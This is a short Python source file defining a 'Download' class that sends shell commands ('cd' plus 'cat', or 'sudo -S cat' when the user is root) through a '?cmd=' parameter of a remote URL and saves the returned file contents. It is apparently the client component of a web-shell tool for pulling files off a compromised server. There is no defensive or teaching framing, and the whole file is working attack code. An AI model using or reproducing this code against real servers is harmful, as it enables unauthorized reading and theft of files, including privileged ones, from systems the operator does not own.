import requests
import base64

class Download:
    ctx=''

    def __init__(self,filename,basedir,user,url):
        self.filename=filename
        self.dir=basedir
        self.user=user
        self.url=url

    def exe(self):
        
        if self.user=='root':
            
            #print(self.url+'?cmd= cd '+self.dir+';' + 'sudo -S cat ' + self.filename)
            res = requests.get(url=self.url+'?cmd= cd '+self.dir+';' + 'sudo -S cat ' + self.filename)
            Download.ctx=res.text
            

        else:
            #print(self.url+'?cmd= cd '+self.dir+';' + 'sudo -S cat ' + self.filename)
            res = requests.get(url=self.url+'?cmd= cd '+self.dir+';' + 'cat ' + self.filename) 
            Download.ctx=res.text